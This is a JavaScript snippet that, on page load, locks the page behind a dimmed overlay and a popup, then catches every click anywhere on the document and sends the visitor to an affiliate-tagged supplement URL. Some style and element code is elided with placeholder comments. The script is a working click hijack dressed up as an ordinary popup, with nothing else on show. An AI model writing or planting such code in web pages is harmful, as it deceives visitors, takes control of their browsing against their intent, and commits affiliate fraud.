document.addEventListener('DOMContentLoaded', function() {
    const style = document.createElement('style');
    style.textContent = `
        body.popup-active {
            overflow: hidden;
            pointer-events: none;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            z-index: 999;
            pointer-events: all;
        }

        .popup {
            pointer-events: all;
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #ffffff;
            padding: 24px;
            border-radius: 4px;
            z-index: 1000;
            width: 90%;
            max-width: 1200px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        /* Rest of the styles remain the same */
        /* ... */
    `;
    
    document.head.appendChild(style);
    document.body.classList.add('popup-active');

    // Create overlay and popup elements as before
    // ... 

    document.addEventListener('click', function() {
        window.location.href = 'https://mitolyn.org/welcome/?aff=fofurinhas';
    });
});
